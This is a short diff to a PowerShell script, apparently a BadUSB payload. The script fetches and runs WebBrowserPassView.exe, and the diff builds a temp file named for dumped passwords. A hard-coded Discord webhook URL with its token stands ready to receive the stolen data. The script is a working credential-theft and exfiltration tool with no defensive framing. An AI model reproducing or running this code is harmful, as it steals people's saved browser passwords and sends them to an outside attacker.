@@ -9,7 +9,7 @@ Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebB
 Start-Sleep -Seconds 10
 
 RI WebBrowserPassView.exe
-
+$dir = "$env:Temp"
 # Remove-MpPreference -ExclusionPath 'C:\Users\Public\Documents'
 
 ############################################################################################################################################################
@@ -27,7 +27,7 @@ param (
 )
 $dc = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
 $hookurl = "$dc"
-
+$file = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"
 $Body = @{
   'username' = $env:username
   'content' = $text
